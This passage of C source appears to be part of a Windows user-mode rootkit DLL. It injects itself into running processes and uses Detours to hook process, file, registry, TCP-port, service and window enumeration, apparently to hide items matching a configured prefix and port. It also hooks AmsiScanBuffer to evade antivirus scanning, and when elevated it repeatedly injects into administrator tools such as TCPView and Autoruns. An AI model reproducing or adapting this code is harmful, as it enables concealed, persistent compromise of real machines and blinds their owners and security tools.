                    if (!IsAlreadyInjected(pid))
                        InjectIntoProcess(pid);
                } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }
        Sleep(2000);
    }
    return 0;
}

// ── Hook installation thread ─────────────────────────────────────────────────
// DetourUpdateThread is called for EVERY thread in the process before
// DetourTransactionCommit — this is the critical fix that prevents crashes
// in multi-threaded processes (explorer.exe, taskmgr.exe, etc.).

static DWORD WINAPI HookThread(LPVOID)
{
    LoadConfig();
    Logf("HookThread: PID=%lu prefix='%s' port=%d", GetCurrentProcessId(), g_prefix, (int)g_hiddenPort);

    if (g_prefixLen == 0) {
        Logf("HookThread: empty prefix, aborting (DLL name not recognized)");
        return 0;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        Logf("GetModuleHandleA(ntdll.dll) failed GLE=%lu", GetLastError());
        return 0;
    }

    TrueNtQuerySystemInformation  = (NtQuerySystemInformation_t)  GetProcAddress(hNtdll, "NtQuerySystemInformation");
    TrueNtGetNextProcess          = (NtGetNextProcess_t)           GetProcAddress(hNtdll, "NtGetNextProcess");
    TrueNtQueryDirectoryFile      = (NtQueryDirectoryFile_t)       GetProcAddress(hNtdll, "NtQueryDirectoryFile");
    TrueNtQueryDirectoryFileEx    = (NtQueryDirectoryFileEx_t)     GetProcAddress(hNtdll, "NtQueryDirectoryFileEx");
    TrueNtQueryKey                = (NtQueryKey_t)                 GetProcAddress(hNtdll, "NtQueryKey");
    TrueNtEnumerateKey            = (NtEnumerateKey_t)             GetProcAddress(hNtdll, "NtEnumerateKey");
    TrueNtEnumerateValueKey       = (NtEnumerateValueKey_t)        GetProcAddress(hNtdll, "NtEnumerateValueKey");
    TrueNtDeviceIoControlFile     = (NtDeviceIoControlFile_t)      GetProcAddress(hNtdll, "NtDeviceIoControlFile");
    TrueNtResumeThread            = (NtResumeThread_t)             GetProcAddress(hNtdll, "NtResumeThread");
    TrueNtQueryObject             = (NtQueryObject_t)              GetProcAddress(hNtdll, "NtQueryObject");

    // AMSI — only present in amsi.dll if loaded (PowerShell, WScript etc.)
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (hAmsi) TrueAmsiScanBuffer = (AmsiScanBuffer_t)GetProcAddress(hAmsi, "AmsiScanBuffer");

    // GetModuleHandleA only — never force-load iphlpapi into processes that don't have it.
    // Calling LoadLibraryA here chains DLL loads that crash taskmgr.exe and other sensitive processes.
    HMODULE hIph = GetModuleHandleA("iphlpapi.dll");
    if (hIph) TrueGetExtendedTcpTable = (GetExtendedTcpTable_t)GetProcAddress(hIph, "GetExtendedTcpTable");

    // win32u — only in GUI processes; safe to skip in console/service processes
    HMODULE hWin32u = GetModuleHandleA("win32u.dll");
    if (hWin32u) TrueNtUserBuildHwndList = (NtUserBuildHwndList_t)GetProcAddress(hWin32u, "NtUserBuildHwndList");

    // advapi32 service enumeration — always loaded in user processes
    HMODULE hAdv = GetModuleHandleA("advapi32.dll");
    if (hAdv) {
        TrueEnumServicesStatusA   = (EnumServicesStatusA_t)  GetProcAddress(hAdv, "EnumServicesStatusA");
        TrueEnumServicesStatusW   = (EnumServicesStatusW_t)  GetProcAddress(hAdv, "EnumServicesStatusW");
        TrueEnumServiceGroupW     = (EnumServiceGroupW_t)    GetProcAddress(hAdv, "EnumServiceGroupW");
        TrueEnumServicesStatusExA = (EnumServicesStatusExA_t)GetProcAddress(hAdv, "EnumServicesStatusExA");
        TrueEnumServicesStatusExW = (EnumServicesStatusExW_t)GetProcAddress(hAdv, "EnumServicesStatusExW");
    }
    // sechost — Windows 10+ routes EnumServicesStatusExW through sechost.dll
    HMODULE hSechost = GetModuleHandleA("sechost.dll");
    if (hSechost) TrueEnumServicesStatusExW2 = (EnumServicesStatusExW_t)GetProcAddress(hSechost, "EnumServicesStatusExW");

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    // Collect ALL thread handles and keep them open until AFTER DetourTransactionCommit.
    // Detours stores the raw HANDLE values internally and calls SuspendThread/ResumeThread
    // on them during commit. Closing handles before commit leaves dangling values inside
    // Detours — threads end up permanently suspended → Explorer freeze.
    HANDLE threadHandles[256] = {};
    DWORD  threadCount = 0;

    DWORD thisPid = GetCurrentProcessId();
    DWORD thisTid = GetCurrentThreadId();
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te;
        te.dwSize = sizeof(THREADENTRY32);
        if (Thread32First(hSnap, &te)) {
            do {
                if (te.th32OwnerProcessID == thisPid && te.th32ThreadID != thisTid) {
                    HANDLE hThread = OpenThread(
                        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
                        FALSE, te.th32ThreadID);
                    if (hThread) {
                        DetourUpdateThread(hThread);
                        if (threadCount < 256)
                            threadHandles[threadCount++] = hThread;
                        else
                            CloseHandle(hThread); // array full, don't track
                    }
                }
            } while (Thread32Next(hSnap, &te));
        }
        CloseHandle(hSnap);
    }

    if (TrueNtQuerySystemInformation)  DetourAttach((PVOID*)&TrueNtQuerySystemInformation,  HookedNtQuerySystemInformation);
    if (TrueNtGetNextProcess)          DetourAttach((PVOID*)&TrueNtGetNextProcess,           HookedNtGetNextProcess);
    if (TrueNtQueryDirectoryFile)      DetourAttach((PVOID*)&TrueNtQueryDirectoryFile,       HookedNtQueryDirectoryFile);
    if (TrueNtQueryDirectoryFileEx)    DetourAttach((PVOID*)&TrueNtQueryDirectoryFileEx,     HookedNtQueryDirectoryFileEx);
    if (TrueNtQueryKey)                DetourAttach((PVOID*)&TrueNtQueryKey,                 HookedNtQueryKey);
    if (TrueNtEnumerateKey)            DetourAttach((PVOID*)&TrueNtEnumerateKey,             HookedNtEnumerateKey);
    if (TrueNtEnumerateValueKey)       DetourAttach((PVOID*)&TrueNtEnumerateValueKey,        HookedNtEnumerateValueKey);
    if (TrueGetExtendedTcpTable)       DetourAttach((PVOID*)&TrueGetExtendedTcpTable,        HookedGetExtendedTcpTable);
    if (TrueNtDeviceIoControlFile)     DetourAttach((PVOID*)&TrueNtDeviceIoControlFile,      HookedNtDeviceIoControlFile);
    if (TrueNtResumeThread)            DetourAttach((PVOID*)&TrueNtResumeThread,             HookedNtResumeThread);
    if (TrueAmsiScanBuffer)            DetourAttach((PVOID*)&TrueAmsiScanBuffer,             HookedAmsiScanBuffer);
    if (TrueNtUserBuildHwndList)       DetourAttach((PVOID*)&TrueNtUserBuildHwndList,        HookedNtUserBuildHwndList);
    if (TrueEnumServicesStatusA)       DetourAttach((PVOID*)&TrueEnumServicesStatusA,        HookedEnumServicesStatusA);
    if (TrueEnumServicesStatusW)       DetourAttach((PVOID*)&TrueEnumServicesStatusW,        HookedEnumServicesStatusW);
    if (TrueEnumServiceGroupW)         DetourAttach((PVOID*)&TrueEnumServiceGroupW,          HookedEnumServiceGroupW);
    if (TrueEnumServicesStatusExA)     DetourAttach((PVOID*)&TrueEnumServicesStatusExA,      HookedEnumServicesStatusExA);
    if (TrueEnumServicesStatusExW)     DetourAttach((PVOID*)&TrueEnumServicesStatusExW,      HookedEnumServicesStatusExW);
    if (TrueEnumServicesStatusExW2)    DetourAttach((PVOID*)&TrueEnumServicesStatusExW2,     HookedEnumServicesStatusExW2);

    LONG st = DetourTransactionCommit();

    // Now safe to close — Detours has finished using all thread handles
    for (DWORD i = 0; i < threadCount; i++)
        CloseHandle(threadHandles[i]);

    Logf("DetourTransactionCommit returned %ld", st);

    // If elevated, start periodic spray to catch new elevated processes
    // (TCPView, Autoruns etc. run as admin can't be reached by NtResumeThread hook
    //  from non-elevated parent processes)
    if (IsElevated()) {
        Logf("HookThread: elevated=1 — starting spray loop");
        HANDLE hSp = CreateThread(NULL, 0, SprayThread, NULL, 0, NULL);
        if (hSp) CloseHandle(hSp);
    } else {
        Logf("HookThread: elevated=0 — no spray");
    }

    return 0;
}

// ── DllMain ──────────────────────────────────────────────────────────────────
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        g_hInstance = hinstDLL;
        GetModuleFileNameW(hinstDLL, g_dllPath, MAX_PATH);

        // Build x86 DLL path: "aahah.dll" → "aahah32.dll" (same directory)
        wcscpy_s(g_dllPath32, g_dllPath);
        WCHAR* dot32 = wcsrchr(g_dllPath32, L'.');
        if (dot32) {
            // Only set g_dllPath32 when THIS is the x64 DLL (name does not already end in "32")
            // If this IS the x86 DLL, g_dllPath32 stays empty — x86 never injects further
            WCHAR stem[MAX_PATH] = { 0 };
            size_t stemLen = (size_t)(dot32 - g_dllPath32);
            wcsncpy_s(stem, g_dllPath32, stemLen);
            if (stemLen < 2 || stem[stemLen-1] != L'2' || stem[stemLen-2] != L'3') {
                // x64 DLL: build the x86 companion path
                *dot32 = L'\0';
                wcsncat_s(g_dllPath32, L"32.dll", _TRUNCATE);
                // If the x86 DLL does not exist on disk, clear the path so we don't try to inject it
                if (GetFileAttributesW(g_dllPath32) == INVALID_FILE_ATTRIBUTES)
                    g_dllPath32[0] = L'\0';
            } else {
                // This IS the x86 DLL — don't set g_dllPath32
                g_dllPath32[0] = L'\0';
            }
        } else {
            g_dllPath32[0] = L'\0';
        }

        InitializeCriticalSection(&g_kphCS);
        LogInit();
        Logf("DllMain ATTACH: PID=%lu path=%ls path32=%ls", GetCurrentProcessId(), g_dllPath, g_dllPath32);

        gTls_EnumerateKey_CacheKey       = TlsAlloc();
        gTls_EnumerateKey_CacheIndex     = TlsAlloc();
        gTls_EnumerateKey_CacheI         = TlsAlloc();
        gTls_EnumerateKey_CacheCorrected = TlsAlloc();

        gTls_EnumerateValueKey_CacheKey       = TlsAlloc();
        gTls_EnumerateValueKey_CacheIndex     = TlsAlloc();
        gTls_EnumerateValueKey_CacheI         = TlsAlloc();
        gTls_EnumerateValueKey_CacheCorrected = TlsAlloc();

        DisableThreadLibraryCalls(hinstDLL);
        HANDLE th = CreateThread(NULL, 0, HookThread, NULL, 0, NULL);
        if (th) CloseHandle(th);
    }
    else if (fdwReason == DLL_PROCESS_DETACH && lpReserved == NULL) {
        // lpReserved == NULL means FreeLibrary was called (not process exit)
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        if (TrueNtQuerySystemInformation)  DetourDetach((PVOID*)&TrueNtQuerySystemInformation,  HookedNtQuerySystemInformation);
        if (TrueNtGetNextProcess)          DetourDetach((PVOID*)&TrueNtGetNextProcess,           HookedNtGetNextProcess);
        if (TrueNtQueryDirectoryFile)      DetourDetach((PVOID*)&TrueNtQueryDirectoryFile,       HookedNtQueryDirectoryFile);
        if (TrueNtQueryDirectoryFileEx)    DetourDetach((PVOID*)&TrueNtQueryDirectoryFileEx,     HookedNtQueryDirectoryFileEx);
        if (TrueNtQueryKey)                DetourDetach((PVOID*)&TrueNtQueryKey,                 HookedNtQueryKey);
        if (TrueNtEnumerateKey)            DetourDetach((PVOID*)&TrueNtEnumerateKey,             HookedNtEnumerateKey);
        if (TrueNtEnumerateValueKey)       DetourDetach((PVOID*)&TrueNtEnumerateValueKey,        HookedNtEnumerateValueKey);
        if (TrueGetExtendedTcpTable)       DetourDetach((PVOID*)&TrueGetExtendedTcpTable,        HookedGetExtendedTcpTable);
        if (TrueNtDeviceIoControlFile)     DetourDetach((PVOID*)&TrueNtDeviceIoControlFile,      HookedNtDeviceIoControlFile);
        if (TrueNtResumeThread)            DetourDetach((PVOID*)&TrueNtResumeThread,             HookedNtResumeThread);
        if (TrueAmsiScanBuffer)            DetourDetach((PVOID*)&TrueAmsiScanBuffer,             HookedAmsiScanBuffer);
        if (TrueNtUserBuildHwndList)       DetourDetach((PVOID*)&TrueNtUserBuildHwndList,        HookedNtUserBuildHwndList);
        if (TrueEnumServicesStatusA)       DetourDetach((PVOID*)&TrueEnumServicesStatusA,        HookedEnumServicesStatusA);
        if (TrueEnumServicesStatusW)       DetourDetach((PVOID*)&TrueEnumServicesStatusW,        HookedEnumServicesStatusW);
        if (TrueEnumServiceGroupW)         DetourDetach((PVOID*)&TrueEnumServiceGroupW,          HookedEnumServiceGroupW);
        if (TrueEnumServicesStatusExA)     DetourDetach((PVOID*)&TrueEnumServicesStatusExA,      HookedEnumServicesStatusExA);
        if (TrueEnumServicesStatusExW)     DetourDetach((PVOID*)&TrueEnumServicesStatusExW,      HookedEnumServicesStatusExW);
        if (TrueEnumServicesStatusExW2)    DetourDetach((PVOID*)&TrueEnumServicesStatusExW2,     HookedEnumServicesStatusExW2);
        DeleteCriticalSection(&g_kphCS);
        DetourTransactionCommit();

        if (gTls_EnumerateKey_CacheKey != TLS_OUT_OF_INDEXES) {
            TlsFree(gTls_EnumerateKey_CacheKey);       TlsFree(gTls_EnumerateKey_CacheIndex);
            TlsFree(gTls_EnumerateKey_CacheI);         TlsFree(gTls_EnumerateKey_CacheCorrected);
        }
        if (gTls_EnumerateValueKey_CacheKey != TLS_OUT_OF_INDEXES) {
            TlsFree(gTls_EnumerateValueKey_CacheKey);       TlsFree(gTls_EnumerateValueKey_CacheIndex);
            TlsFree(gTls_EnumerateValueKey_CacheI);         TlsFree(gTls_EnumerateValueKey_CacheCorrected);
        }
        LogClose();
    }
    return TRUE;
}
